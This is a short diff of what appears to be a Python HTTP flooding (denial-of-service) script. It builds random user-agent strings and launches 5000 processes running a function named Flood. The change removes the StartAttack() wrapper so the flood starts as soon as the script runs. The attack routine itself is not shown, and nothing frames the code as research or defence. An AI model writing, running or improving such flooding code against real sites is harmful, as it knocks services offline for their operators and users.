@@ -145,8 +145,7 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-def StartAttack():
-    for indexPicker in range(5000):
-        thread = multiprocessing.Process(target=Flood)
-        thread.setDaemon = False
-        thread.start()
+for indexPicker in range(5000):
+    thread = multiprocessing.Process(target=Flood)
+    thread.setDaemon = False
+    thread.start()
